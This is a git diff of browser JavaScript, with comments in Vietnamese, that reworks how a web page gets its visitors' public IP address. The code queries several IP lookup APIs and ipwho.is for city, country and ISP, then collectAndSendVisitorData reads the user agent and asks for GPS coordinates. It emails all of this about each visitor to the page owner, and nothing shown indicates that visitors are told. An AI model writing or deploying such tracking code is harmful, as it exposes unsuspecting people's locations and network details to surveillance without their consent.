@@ -152,42 +152,60 @@ function sendEmail(templateParams) {
         });
 }
 
-// Hàm lấy thông tin IP & Vị trí an toàn với nhiều cấp dự phòng (Fallback)
+// 1. HÀM LẤY IP ĐA TẦNG (DỰ PHÒNG LIÊN TỤC)
+async function getPublicIP() {
+    // Danh sách các API lấy IP uy tín không yêu cầu key
+    const ipProviders = [
+        "https://api.ipify.org?format=json",
+        "https://api.my-ip.io/v2/ip.json",
+        "https://ipinfo.io/json",
+        "https://api.seeip.org/jsonip"
+    ];
+
+    for (const url of ipProviders) {
+        try {
+            const response = await fetch(url, { cache: "no-store" });
+            if (response.ok) {
+                const data = await response.json();
+                const ip = data.ip || data.ip_address;
+                if (ip) return ip;
+            }
+        } catch (err) {
+            console.warn(`Lỗi khi lấy IP từ ${url}, thử endpoint tiếp theo...`);
+        }
+    }
+    return "N/A";
+}
+
+// 2. HÀM LẤY VỊ TRÍ ĐỊA LÝ & ISP DỰA TRÊN IP
 async function getIpAndLocation() {
     let result = { ip: "N/A", city: "N/A", country: "N/A", isp: "N/A" };
 
-    // Cách 1: Thử lấy qua ipwho.is (Lấy cả IP + Địa lý + ISP)
-    try {
-        const res = await fetch("https://ipwho.is/");
-        if (res.ok) {
-            const data = await res.json();
-            if (data.success) {
-                return {
-                    ip: data.ip || "N/A",
-                    city: data.city || "N/A",
-                    country: data.country || "N/A",
-                    isp: data.connection?.isp || data.connection?.org || "N/A"
-                };
-            }
-        }
-    } catch (e) {
-        console.warn("ipwho.is bị lỗi, thử lại với API dự phòng...");
-    }
+    // Lấy IP Public trước
+    const ip = await getPublicIP();
+    result.ip = ip;
 
-    // Cách 2 (Dự phòng): Lấy riêng IP qua ipify nếu cách 1 thất bại
-    try {
-        const resIp = await fetch("https://api.ipify.org?format=json");
-        if (resIp.ok) {
-            const dataIp = await resIp.json();
-            result.ip = dataIp.ip || "N/A";
+    if (ip !== "N/A") {
+        // Thử lấy thêm thông tin vị trí & nhà mạng từ IP
+        try {
+            const res = await fetch(`https://ipwho.is/${ip}`);
+            if (res.ok) {
+                const data = await res.json();
+                if (data.success) {
+                    result.city = data.city || "N/A";
+                    result.country = data.country || "N/A";
+                    result.isp = data.connection?.isp || data.connection?.org || "N/A";
+                }
+            }
+        } catch (e) {
+            console.warn("Không thể tra cứu chi tiết vị trí IP, giữ lại IP Public.");
         }
-    } catch (e) {
-        console.error("Không thể kết nối đến server lấy IP");
     }
 
     return result;
 }
 
+// 3. THU THẬP DỮ LIỆU VÀ GỬI EMAIL
 async function collectAndSendVisitorData() {
     const ua = navigator.userAgent;
 
@@ -231,7 +249,7 @@ async function collectAndSendVisitorData() {
         maps_link: "N/A"
     };
 
-    // Kiểm tra GPS
+    // Kiểm tra GPS chính xác
     if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
@@ -245,7 +263,7 @@ async function collectAndSendVisitorData() {
                 templateParams.gps = "Từ chối cấp quyền / Lỗi GPS";
                 sendEmail(templateParams);
             },
-            { timeout: 6000 }
+            { timeout: 5000 }
         );
     } else {
         templateParams.gps = "Không hỗ trợ Geolocation";
